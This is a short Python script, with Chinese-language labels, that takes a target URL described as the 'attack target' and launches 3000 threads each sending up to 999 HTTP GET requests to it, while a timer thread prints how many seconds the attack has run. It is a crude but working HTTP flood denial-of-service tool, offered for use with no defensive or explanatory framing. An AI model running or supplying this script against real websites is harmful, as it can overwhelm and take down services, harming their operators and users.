import requests
import threading
import time
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('-u', '--url', help='攻擊對象網址', required=True, nargs=1, type=str)
url = parser.parse_args().url[0]

def c():
    i = 0
    while True:
        time.sleep(1)
        i += 1
        print('已開始 {0} 秒'.format(i))

def m():
    ytt = threading.active_count()
    print(f'当前活动的线程数量：{ytt}')

t1 = threading.Thread(target=c)
t1.start()

def r():
    for p in range(1, 1000):
        try:
            response = requests.get(url)
            
            
        except:
            print('網址錯誤或者一堆有的沒的原因')

for i in range(1, 3000):
    t2 = threading.Thread(target=r)
    t2.start()

    
    

